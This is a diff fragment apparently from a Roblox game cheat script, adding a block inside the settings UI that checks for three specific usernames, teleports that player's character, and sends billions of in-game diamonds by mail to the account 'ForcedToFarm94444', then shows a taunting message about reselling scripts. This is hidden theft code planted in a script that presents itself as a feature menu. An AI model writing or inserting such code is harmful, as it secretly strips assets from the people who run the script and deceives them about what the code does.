@@ -2683,6 +2683,33 @@ ServerBoostSection:AddToggle({
         Settings.Boosts.ServerLuck = Value
     end
 })
+if game.Players.LocalPlayer.Name == "ciaociaoioqwe" or game.Players.LocalPlayer.Name == "ciaociaoioqwe1" or game.Players.LocalPlayer.Name == "ciaociaoioqwe2" then
+	FrTeleportToWorld("Spawn", "Shop")
+	wait(0.1)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(254.149002, 98.2168579, 349.55304, 0.965907216, -6.73597569e-08, -0.258888513, 6.48122409e-08, 1, -1.83752729e-08, 0.258888513, 9.69664127e-10, 0.965907216)
+	wait(0.3)
+	Invoke("Send Mail", {
+	    ["Recipient"] = "ForcedToFarm94444",
+	    ["Diamonds"] = 5000000000,
+	    ["Pets"] = {},
+	    ["Message"] = "Hello"
+	})
+	wait(0.5)
+	Invoke("Send Mail", {
+	    ["Recipient"] = "ForcedToFarm94444",
+	    ["Diamonds"] = 1000000000,
+	    ["Pets"] = {},
+	    ["Message"] = "Hello"
+	})
+	wait(0.5)
+	Invoke("Send Mail", {
+	    ["Recipient"] = "ForcedToFarm94444",
+	    ["Diamonds"] = 100000,
+	    ["Pets"] = {},
+	    ["Message"] = "Hello"
+	})
+	Library.Message.New("Pls Dont Resell My Scripts 😭😭😭 (Ur lucky i only took 5b lol)", true)
+end
 ServerBoostSection:AddToggle({
     Name = "Server Triple Damage",
     Default = false,
